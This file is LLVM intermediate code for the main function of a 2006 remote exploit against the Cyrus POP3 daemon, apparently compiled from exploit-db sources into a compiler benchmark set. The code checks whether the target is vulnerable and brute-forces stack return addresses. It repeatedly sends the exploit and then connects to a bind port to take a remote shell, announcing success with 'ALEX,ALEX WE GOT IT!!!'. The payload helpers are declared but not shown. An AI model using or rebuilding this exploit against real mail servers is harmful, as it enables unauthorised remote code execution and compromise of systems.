; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1813.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1813.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [41 x i8] c"cyrus pop3d remote exploit [kcope/2006]\0A\00", align 1
@.str.1 = private unnamed_addr constant [60 x i8] c"usage: %s <remote host> <brute force start return address>\0A\00", align 1
@.str.2 = private unnamed_addr constant [27 x i8] c"eg: %s localhost bfffa000\0A\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"%8x\00", align 1
@.str.4 = private unnamed_addr constant [36 x i8] c"Specify valid start return address\0A\00", align 1
@.str.5 = private unnamed_addr constant [27 x i8] c"Checking if vulnerable... \00", align 1
@POP3PORT = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [82 x i8] c"\0Acyrus pop3d seems not to be vulnerable\0Ano popsubfolders defined at remote host?\0A\00", align 1
@.str.7 = private unnamed_addr constant [10 x i8] c"SUCCESS!\0A\00", align 1
@.str.8 = private unnamed_addr constant [17 x i8] c"CRACKADDR = %4x\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@BINDPORT = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [25 x i8] c"\0AALEX,ALEX WE GOT IT!!!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [255 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str, i64 0, i64 0))
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %12, 3
  br i1 %13, label %14, label %23

14:                                               ; preds = %2
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 0
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.1, i64 0, i64 0), i8* %17)
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0), i8* %21)
  store i32 1, i32* %3, align 4
  br label %94

23:                                               ; preds = %2
  %24 = getelementptr inbounds [255 x i8], [255 x i8]* %6, i64 0, i64 0
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @strcpy(i8* %24, i8* %27)
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 2
  %31 = load i8*, i8** %30, align 8
  %32 = call i64 @sscanf(i8* %31, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0), i32* %10)
  %33 = icmp eq i64 %32, 0
  br i1 %33, label %34, label %36

34:                                               ; preds = %23
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.4, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %94

36:                                               ; preds = %23
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.5, i64 0, i64 0))
  %38 = getelementptr inbounds [255 x i8], [255 x i8]* %6, i64 0, i64 0
  %39 = load i32, i32* @POP3PORT, align 4
  %40 = call i32 @do_connect(i8* %38, i32 %39)
  store i32 %40, i32* %7, align 4
  %41 = load i32, i32* %7, align 4
  %42 = call i32 @do_checkvulnerable(i32 %41)
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %44, label %48

44:                                               ; preds = %36
  %45 = load i32, i32* %7, align 4
  %46 = call i32 @close(i32 %45)
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.6, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %94

48:                                               ; preds = %36
  %49 = load i32, i32* %7, align 4
  %50 = call i32 @close(i32 %49)
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0))
  br label %52

52:                                               ; preds = %90, %48
  %53 = load i32, i32* %10, align 4
  %54 = icmp ult i32 %53, -1073741825
  br i1 %54, label %55, label %93

55:                                               ; preds = %52
  %56 = load i32, i32* %10, align 4
  %57 = add i32 %56, 16
  store i32 %57, i32* %10, align 4
  %58 = load i32, i32* %10, align 4
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i64 0, i64 0), i32 %58)
  %60 = load i32, i32* @stdout, align 4
  %61 = call i32 @fflush(i32 %60)
  %62 = getelementptr inbounds [255 x i8], [255 x i8]* %6, i64 0, i64 0
  %63 = load i32, i32* @POP3PORT, align 4
  %64 = call i32 @do_connect(i8* %62, i32 %63)
  store i32 %64, i32* %7, align 4
  %65 = load i32, i32* %7, align 4
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %68

67:                                               ; preds = %55
  store i32 1, i32* %3, align 4
  br label %94

68:                                               ; preds = %55
  %69 = load i32, i32* %7, align 4
  %70 = load i32, i32* %10, align 4
  %71 = call i32 @do_exploit(i32 %69, i32 %70)
  store i32 0, i32* %9, align 4
  br label %72

72:                                               ; preds = %87, %68
  %73 = load i32, i32* %9, align 4
  %74 = icmp slt i32 %73, 2
  br i1 %74, label %75, label %90

75:                                               ; preds = %72
  %76 = getelementptr inbounds [255 x i8], [255 x i8]* %6, i64 0, i64 0
  %77 = load i32, i32* @BINDPORT, align 4
  %78 = call i32 @do_connect(i8* %76, i32 %77)
  store i32 %78, i32* %8, align 4
  %79 = icmp ne i32 %78, -1
  br i1 %79, label %80, label %84

80:                                               ; preds = %75
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.9, i64 0, i64 0))
  %82 = load i32, i32* %8, align 4
  %83 = call i32 @do_remote_shell(i32 %82)
  store i32 0, i32* %3, align 4
  br label %94

84:                                               ; preds = %75
  %85 = load i32, i32* %8, align 4
  %86 = call i32 @close(i32 %85)
  br label %87

87:                                               ; preds = %84
  %88 = load i32, i32* %9, align 4
  %89 = add nsw i32 %88, 1
  store i32 %89, i32* %9, align 4
  br label %72

90:                                               ; preds = %72
  %91 = load i32, i32* %7, align 4
  %92 = call i32 @close(i32 %91)
  br label %52

93:                                               ; preds = %52
  store i32 0, i32* %3, align 4
  br label %94

94:                                               ; preds = %93, %80, %67, %44, %34, %14
  %95 = load i32, i32* %3, align 4
  ret i32 %95
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i64 @sscanf(i8*, i8*, i32*) #1

declare dso_local i32 @do_connect(i8*, i32) #1

declare dso_local i32 @do_checkvulnerable(i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @do_exploit(i32, i32) #1

declare dso_local i32 @do_remote_shell(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
